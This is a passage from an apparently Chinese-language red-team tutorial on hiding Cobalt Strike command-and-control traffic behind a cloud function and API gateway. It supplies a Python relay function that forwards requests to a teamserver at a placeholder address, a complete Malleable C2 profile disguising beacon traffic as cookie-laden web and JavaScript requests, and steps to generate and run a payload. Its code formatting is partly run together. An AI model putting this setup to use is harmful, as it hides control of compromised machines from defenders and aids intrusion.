0x02 正式隐藏c2


首先是修改云函数的python代码，具体可修改为如下：


# coding: utf8import json,requests,base64def main_handler(event, context):    C2='http://ip:port'    path=event['path']    headers=event['headers']    print(event)if event['httpMethod'] == 'GET' :        resp=requests.get(C2+path,headers=headers,verify=False) else:        resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)        print(resp.headers)        print(resp.content)
    response={"isBase64Encoded": True,"statusCode": resp.status_code,"headers": dict(resp.headers),"body": str(base64.b64encode(resp.content))[2:-1]    }return response


其中c2地址为cs监听器地址，测试过程中发现只能使用默认80端口才可以转发。so这个地方直接填c2的ip地址即可。

然后是需要修改api网关地址，去掉其他路径，即要求直接访问api网关可触发云函数。其他文章说的挺明白了，不再赘述。



接下来给cs增加一个profile配置文件，同样用网上较多人使用的一个版本，无须修改。


set sample_name "kris_abao";
set sleeptime "3000";set jitter    "0";set maxdns    "255";set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";
http-get {
set uri "/api/getit";
    client {        header "Accept" "*/*";        metadata {            base64;            prepend "SESSIONID=";            header "Cookie";        }    }
    server {        header "Content-Type" "application/ocsp-response";        header "content-transfer-encoding" "binary";        header "Server" "Nodejs";        output {            base64;print;        }    }}http-stager {  set uri_x86 "/vue.min.js";set uri_x64 "/bootstrap-2.min.js";}http-post {set uri "/api/postit";    client {        header "Accept" "*/*";        id {            base64;            prepend "JSESSION=";            header "Cookie";        }        output {            base64;print;        }    }
    server {        header "Content-Type" "application/ocsp-response";        header "content-transfer-encoding" "binary";        header "Connection" "keep-alive";        output {            base64;print;        }    }}


在c2端执行teamserver时候，加载该配置文件。



然后cs客户端连接teamserver端，增加监听器，如上文所述，该处必须使用80端口，填入api网关的地址。



生成payload，执行即可上线。观察一下效果，还可以。
